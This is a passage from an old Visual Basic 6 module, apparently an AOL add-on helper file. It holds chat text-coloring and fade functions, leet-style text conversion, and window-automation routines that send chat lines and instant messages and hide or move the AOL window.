End Sub

Function Black_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, f, f - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Black_LBlue = Msg
End Function


Function Bold_italic_colorR_Backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = NextChr$ & newsent$
Loop
BoldRedBlackRed (newsent$)
End Function


Public Sub SCROLLfiveline(txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(A, D)
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$ & "" + Text1.Text + ""
Timeout 0.3
SendChat "" + Text1.Text + "" & C$
Timeout 0.3
End Sub

Sub Attention(TheText As String)
'G$ = WavYChaT("Surge ")
'L$ = WavYChaT(" by JoLT")
'aa$ = WavYChaT("Attention")
SendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
SendChat (TheText)
Call Timeout(0.15)
SendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call Timeout(0.15)
'SendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub centerform(f As Form)
f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub


Function CoLoRChaTBlueBlack(TheText As String)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#00F" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
CoLoRChaT = p$
End Function
Function ColorChatRedBlue(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
ColorChatRedBlue = p$

End Function

Function ColorChatRedGreen(TheText)
G$ = TheText
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & T$
Next W
ColorChatRedGreen = p$

End Function

Sub EliteTalker(Word$)
Made$ = ""
For q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "d" Then leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If letter$ = "`" Then leet$ = "´"
    If letter$ = "!" Then leet$ = "¡"
    If letter$ = "?" Then leet$ = "¿"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next q
SendChat (Made$)
End Sub
Function EliteText(Word$)
Made$ = ""
For q = 1 To Len(Word$)
    letter$ = ""
    letter$ = Mid$(Word$, q, 1)
    leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then leet$ = "â"
    If X = 2 Then leet$ = "å"
    If X = 3 Then leet$ = "ä"
    End If
    If letter$ = "b" Then leet$ = "b"
    If letter$ = "c" Then leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then leet$ = "ë"
    If X = 2 Then leet$ = "ê"
    If X = 3 Then leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then leet$ = "ì"
    If X = 2 Then leet$ = "ï"
    If X = 3 Then leet$ = "î"
    End If
    If letter$ = "j" Then leet$ = ",j"
    If letter$ = "n" Then leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then leet$ = "ô"
    If X = 2 Then leet$ = "ð"
    If X = 3 Then leet$ = "õ"
    End If
    If letter$ = "s" Then leet$ = "š"
    If letter$ = "t" Then leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then leet$ = "ù"
    If X = 2 Then leet$ = "û"
    If X = 3 Then leet$ = "ü"
    End If
    If letter$ = "w" Then leet$ = "vv"
    If letter$ = "y" Then leet$ = "ÿ"
    If letter$ = "0" Then leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then leet$ = "Å"
    If X = 2 Then leet$ = "Ä"
    If X = 3 Then leet$ = "Ã"
    End If
    If letter$ = "B" Then leet$ = "ß"
    If letter$ = "C" Then leet$ = "Ç"
    If letter$ = "D" Then leet$ = "Ð"
    If letter$ = "E" Then leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then leet$ = "Ï"
    If X = 2 Then leet$ = "Î"
    If X = 3 Then leet$ = "Í"
    End If
    If letter$ = "N" Then leet$ = "Ñ"
    If letter$ = "O" Then leet$ = "Õ"
    If letter$ = "S" Then leet$ = "Š"
    If letter$ = "U" Then leet$ = "Û"
    If letter$ = "W" Then leet$ = "VV"
    If letter$ = "Y" Then leet$ = "Ý"
    If Len(leet$) = 0 Then leet$ = letter$
    Made$ = Made$ & leet$
Next q

EliteText = Made$

End Function
Function FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Room% = FindChildByClass(MDI%, "AOL Child")
stuff% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = Room%
Else:
   FindChatRoom = 0
End If
End Function
Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
Room% = firs%
FindChildByClass = Room%

End Function
Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
Room% = firs%
FindChildByTitle = Room%
End Function
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function

Public Sub FormExitDown(theform As Form)
    Do
        DoEvents
        theform.Top = Trim(Str(Int(theform.Top) + 300))
    Loop Until theform.Top > 7200
End Sub


Public Sub FormExitLeft(theform As Form)
    Do
        DoEvents
        theform.Left = Trim(Str(Int(theform.Left) - 300))
    Loop Until theform.Left < -theform.Width
End Sub


Public Sub FormExitRight(theform As Form)
    Do
        DoEvents
        theform.Left = Trim(Str(Int(theform.Left) + 300))
    Loop Until theform.Left > Screen.Width
End Sub


Public Sub FormExitUp(theform As Form)
    Do
        DoEvents
        theform.Top = Trim(Str(Int(theform.Top) - 300))
    Loop Until theform.Top < -theform.Width
End Sub
Public Sub FormOnTop(FormName As Form)
    Call SetWindowPos(FormName.hwnd, HWND_TOPMOST, 0&, 0&, 0&, 0&, Flags)
End Sub

Public Sub FormNotOnTop(FormName As Form)
    Call SetWindowPos(FormName.hwnd, HWND_NOTOPMOST, 0&, 0&, 0&, 0&, Flags)
End Sub


Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
A% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function


Function GetChatText()
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
ChatText = GetText(AORich%)
GetChatText = ChatText
End Function

Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function


Function GetText(child)
GetTrim = sendmessagebynum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMEssageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function


Sub Hideaol()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(AOL%, 0)
End Sub
Sub MinimizeAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(AOL%, 6)
End Sub
Sub MaximizeAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(AOL%, 3)
End Sub
Sub IMBuddy(Recipiant, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Buddy% = FindChildByTitle(MDI%, "Buddy List Window")

If Buddy% = 0 Then
    Keyword ("BuddyView")
    Do: DoEvents
    Loop Until Buddy% <> 0
End If

AOIcon% = FindChildByClass(Buddy%, "_AOL_Icon")

For L = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next L

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

'Sub MyName()
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::               :::       ::::::::::: ")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::    :::::::    :::           :::")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>:::   :::   :::   :::   :::           :::")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B> :::::::     :::::::    :::::::::     :::")
'End Sub

Sub IMIgnore(TheList As ListBox)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Im% = FindChildByTitle(MDI%, ">Instant Message From:")
If Im% <> 0 Then
    For findsn = 0 To TheList.ListCount
        If LCase$(TheList.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = Im%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function CLRBars(RedBar As Control, GreenBar As Control, BlueBar As Control)
'This gets a color from 3 scroll bars
CLRBars = RGB(RedBar.Value, GreenBar.Value, BlueBar.Value)

'Put this in the scroll event of the
'3 scroll bars RedScroll1, GreenScroll1,
'& BlueScroll1.  It changes the backcolor
'of ColorLbl when you scroll the bars
'ColorLbl.BackColor = CLRBars(RedScroll1, GreenScroll1, BlueScroll1)

End Function

Function FadeByColor10(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, Colr10, TheText$, Wavy As Boolean)

dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
dacolor10$ = RGBtoHEX(Colr10)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))
rednum9% = Val("&H" + Right(dacolor9$, 2))
greennum9% = Val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = Val("&H" + Left(dacolor9$, 2))
rednum10% = Val("&H" + Right(dacolor10$, 2))
greennum10% = Val("&H" + Mid(dacolor10$, 3, 2))
bluenum10% = Val("&H" + Left(dacolor10$, 2))


FadeByColor10 = FadeTenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, rednum10%, greennum10%, bluenum10%, TheText, Wavy)

End Function

Function FadeByColor2(Colr1, Colr2, TheText$, Wavy As Boolean)

dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))

FadeByColor2 = FadeTwoColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, TheText, Wavy)

End Function
Function FadeByColor3(Colr1, Colr2, Colr3, TheText$, Wavy As Boolean)

dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))

FadeByColor3 = FadeThreeColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, TheText, Wavy)

End Function
Function FadeByColor4(Colr1, Colr2, Colr3, Colr4, TheText$, Wavy As Boolean)

dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))

FadeByColor4 = FadeFourColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, TheText, Wavy)

End Function

Function FadeByColor5(Colr1, Colr2, Colr3, Colr4, Colr5, TheText$, Wavy As Boolean)

dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))

FadeByColor5 = FadeFiveColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, TheText, Wavy)

End Function

Function FadeFiveColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, TheText$, Wavy As Boolean)

    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Right(TheText, frthlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFiveColor = Faded1$ + Faded2$ + Faded3$ + Faded4$
End Function
Function FadeTenColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, R6%, G6%, B6%, R7%, G7%, B7%, R8%, G8%, B8%, R9%, G9%, B9%, R10%, G10%, B10%, TheText$, Wavy As Boolean)

    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    frthlen% = frthlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    fithlen% = fithlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    sixlen% = sixlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    eightlen% = eightlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    ninelen% = ninelen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(TheText, fstlen%)
    part2$ = Mid(TheText, fstlen% + 1, seclen%)
    part3$ = Mid(TheText, fstlen% + seclen% + 1, thrdlen%)
    part4$ = Mid(TheText, fstlen% + seclen% + thrdlen% + 1, frthlen%)
    part5$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + 1, fithlen%)
    part6$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + 1, sixlen%)
    part7$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + 1, sevlen%)
    part8$ = Mid(TheText, fstlen% + seclen% + thrdlen% + frthlen% + fithlen% + sixlen% + sevlen% + 1, eightlen%)
    part9$ = Right(TheText, ninelen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        ColorX = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(ColorX)
        
        If Wavy = True Then
        WaveState = WaveState + 1
        If WaveState > 4 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        Else
        WaveHTML = ""
        End If
        
